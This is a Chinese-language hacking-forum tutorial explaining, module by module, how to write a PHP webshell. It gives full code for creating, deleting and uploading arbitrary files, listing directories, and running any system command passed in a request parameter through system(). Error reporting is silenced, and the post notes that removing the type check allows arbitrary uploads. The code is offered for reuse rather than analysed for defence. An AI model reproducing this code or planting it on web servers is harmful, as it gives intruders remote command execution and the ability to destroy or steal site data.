> 本文原创作者：Laimooc  
>

  
  

 **第一部分：前沿综述**

本次我主要写了 **【文件的创建】、【文件的删除】、【文件的上传】、【目录浏览】、【命令执行】** 小模块，以及 **【组合的目录浏览和文件删除功能】**
的模块：

  
![1.png](https://image.3001.net/images/20180115/15160127044350.png!small)  

 **实验环境：**

系统环境：winserver 12 r2 datacenter

脚本运行环境：PHP version7.0.24

 **第二部分：代码编写讲解**

 **【文件创建】**

作者是借助form表单值传递，以及使用fopen和fwrite进行创建文件的。

具体的研究过程，我们结合代码来说明：

    
    
    <form  method="" action="">
    Filename:<inputtype="text" name="file" value="" /> 

这里我们是使用input标签，设定name值（这个，我们后面的php脚本中需要使用的，需要记住）：

  
![2.png](https://image.3001.net/images/20180115/15160127149709.png!small)  

我的代码如下，大家请指导：

    
    
    File_content:<inputtype="textarea" name="file_content"style="width:300px;" value="" />

这里我们是接受form表单传递你要写的文件内容，有想深入的表格，可以对内容的写入上做出一些[编码解码](https://bbs.ichunqiu.com/thread-29083-1-1.html?from=beef)等的操作

    
    
    <input type="submit" name="submit" value="Create">
    这里是提交按钮
    </form>
    <?php
    error_reporting(0);
    //这里我们设置了错误等级为0
    $filename=$_REQUEST['file'];
    //这里接受我们的文件名字
    $file_content=$_REQUEST['file_content'];
    //这里接受我们的文件内容
    $myfile =fopen($filename, "a") ;
    //这里打开你事先设定的文件，如果没有会创建一个新的（由写入属性a a+ w w+ r r+ ab ab+等控制）
    fwrite($myfile,$file_content);
    //这里执行fwrite函数写入内容
    fclose($myfile);
    //关闭写入的文件
    ?>

![3.png](https://image.3001.net/images/20180115/1516012732909.png!small)  

 **【文件删除】**

下面是我们的删除文件代码，依然是[借助](https://bbs.ichunqiu.com/thread-29083-1-1.html?from=beef)了form表单，这样主要是为了操作起来方便，不用form表单也可以操作，只是比较麻烦（get或者post请求等）

代码如下：

  
![4.png](https://image.3001.net/images/20180115/15160127423277.png!small)  

    
    
    <form  method="" action="">
    Filename:<inputtype="text" name="delfile" value="">
    <inputtype="submit" name="submit" value="delete">
    </form>
    form表单的意思同上述我们阐述的意思，不再介绍，不懂的同学，可以下方留言给我，第一时间必回复
    <?php
    error_reporting(0);
    //删除文件
    $delfile=$_REQUEST['delfile'];
    if(!isset($delfile)){
           exit;//判断是否设定了delfile
    }
    else{
           if (!unlink($delfile))
      {
      echo ("Error delete $delfile");
      //如果没有权限等其他原因文件未删除时候的信息
      }
    else
      {
      echo ("Deleted $file");
      //删除成功的返回
      }
    }
    /*
    使用方法：finame中输入1.txt 表示当前文件夹下的文件，可以输入指定文件夹中的文件如：/upload/1.txt ,即可。
    删除成功的话：返回Deleted fiel 失败的话返回ErrorDelete。。。
    */
    ?>

  
![5.png](https://image.3001.net/images/20180115/15160127522815.png!small)  

 **【文件上传】**

文件的上传，这个是大家应该比较多见的了，文件类型的限制啦、存储等（如果作大马的话，当然是任意文件上传啦），不再[详细](https://www.laimooc.cn/index.html)的解释直接展示一下代码，如果大家有什么不懂之处也可以在下方留言给我：

![6.png](https://image.3001.net/images/20180115/15160128529570.png!small)![7.png](https://image.3001.net/images/20180115/15160128527424.png!small)  

代码如下：

    
    
    <form action="" method="post" enctype="multipart/form-data" />
    <label for="userfile">Upload file</label>
    <input type="file" name="file" id="file"/>
    <input type="submit" value="send file"/>
    </form>
    
    <?php
    error_reporting(0);
    //设置允许上传的mime类型，直接删除下面一段代码的话，则是任意文件上传
    if ((($_FILES["file"]["type"] == "image/gif")
    || ($_FILES["file"]["type"] == "text/plain")
    || ($_FILES["file"]["type"] == "application/octet-stream")))
      {
      if ($_FILES["file"]["error"] > 0)
        {
        echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
        }
      else
        {
        echo "Upload: " . $_FILES["file"]["name"] . "<br />";//获取文件名称
        echo "Type: " . $_FILES["file"]["type"] . "<br />"; //获取文件类型
        echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";//获取文件大小
        echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";//文件上传时的暂存目录
        //判断文件是否已经存在
        if (file_exists("upload/" . $_FILES["file"]["name"]))
          {
          echo $_FILES["file"]["name"] . " already exists. ";
          }
        else
          {
                  //从缓存目录move文件到要上传的目录
          move_uploaded_file($_FILES["file"]["tmp_name"],
          "upload/" . $_FILES["file"]["name"]);
          echo "Stored in: " . "upload/" . $_FILES["file"]["name"];
          }
        }
      }
    else
      {
      exit;
      }
    ?>

 **【目录浏览】**

文件的浏览，我还没有仔细的研究，有深入研究的朋友，可以在下方回复代码哇，一起进（fei）步（sheng），我的代码比较垃圾：
**我直接指定了要遍历的文件目录，在编写的过程中，我发现如果目录不存在的话，会直接浏览器占用资源崩溃！！！**

![7.png](https://image.3001.net/images/20180115/15160128192231.png!small)  

    
    
     <?php
    error_reporting(0);
    header("Content-type:text/html; charset=utf8");
    //读取指定目录 upload
    $current_dir='upload';
    $dir =opendir($current_dir);
    echo '本文件：',dirname(__FILE__),'\\',basename(__FILE__),'<br/>';
    //echo '当前文件：',__FILE__ ,'<br/>' ;
    while(false !==($file = readdir($dir))){
           if($file != "." &&$file !=".."){
                  echo"<li>$file</li>";
           }
    }
    closedir($dir);
    ?>
    此外，参考了别人的dir()函数和getcwd()，觉得挺不错的，可以结合使用，大家可以改造一下。
    <?php
    $d =dir(getcwd());
    echo "Handle:" . $d->handle . "<br>";
    echo "Path:" . $d->path . "<br>";
    while (($file =$d->read()) !== false){
      echo "filename: " . $file ."<br>";
    }
    $d->close();
    ?>

 **【命令执行】**

命令执行，这是一个好玩的东西，php给了我们一些直接可以执行系统命令的函数: exec()、passthru()、system()、
shell_exec() 还有一个神奇的：反引号。

反引号，听起来尬不?

我的研究是使用system进行执行命令的，然后结合form表单进行值传递，主要还是为了表单的美观：

  
![8.png](https://image.3001.net/images/20180115/15160128013980.png!small)  

代码如下：

    
    
    <form method="" action="">
    Command:<input type="text"name="exec" value="">
    <input type="submit"name="submit" value="exec">
    </form>
    
    <?php
    error_reporting(0);
    $exec = $_REQUEST['exec']; //接收form表单传递过来的命令
    system($exec);//可以替换为其他的执行函数
    ?>

 **【组合的目录浏览和文件删除功能】**

本小节是为了抛砖引玉，整体的变幻构造组合等，需要大家共同努力，直接展示一下代码：

  

代码如下：

    
    
    <?php
    error_reporting(0);
    header("Content-type: text/html; charset=utf8");
    //读取指定目录 upload
    $current_dir ='upload';
    $dir = opendir($current_dir);
    echo '本文件：',dirname(__FILE__) ,'\\',basename(__FILE__),'<br/>';
    //echo '当前文件：',__FILE__ ,'<br/>' ;
    
    while(false !== ($file = readdir($dir))){
            if($file != "." && $file !=".."){
                    echo "<li>$file</li>";
            }
    }
    closedir($dir);
    ?>
    
    <form  method="" action="">
    Filename:<input type="text" name="delfile" value="">
    <input type="submit" name="submit" value="delete">
    </form>
    
    <?php
    //删除文件
    $delfile=$_REQUEST['delfile'];
    if(!isset($delfile)){
            exit;
    }
    else{
            if (!unlink($delfile))
      {
      echo ("Error deleting $delfile");
      }
    else
      {
      echo ("Deleted $file");
      }
    
    }
    ?>
    

**第三部分：文章总结![9.png](https://image.3001.net/images/20180115/15160127868252.png!small)  
**

 **  
**

**![10.png](https://image.3001.net/images/20180115/15160127869947.png!small)**

本次研究是继双十一之夜，睡不着觉，就来发了一篇文章，希望得到大家的指导，路过请留言，一带一路。

  

 **[附件回原文下载](https://bbs.ichunqiu.com/thread-29083-1-1.html?from=beef)**
<<<<<<<<  

  

  

 ** **[>>>>>>黑客入门必备技能](https://www.ichunqiu.com/zhihu?from=beef)
带你入坑，和逗比表哥们一起聊聊黑客的事儿，他们说高精尖的技术比农药都好玩！  
****  

